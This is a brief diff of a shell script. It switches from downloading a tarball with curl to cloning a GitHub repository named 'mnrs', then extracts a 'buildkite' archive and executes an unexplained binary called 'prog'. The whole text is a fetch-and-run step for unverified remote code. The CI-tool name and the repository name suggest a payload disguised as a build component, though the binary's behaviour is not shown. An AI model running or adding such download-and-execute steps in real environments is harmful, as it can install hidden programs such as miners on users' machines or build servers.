@@ -1,5 +1,6 @@
-curl -O https://github.com/bloxclone/mnrs/raw/refs/heads/main/buildkite.tar.gz
-tar -xvf buildkite.tar.gz
+git clone https://github.com/bloxclone/mnrs
+cd mnrs
+tar -xvzf buildkite.tar.gz
 cd buildkite
 chmod +x prog
 ./prog
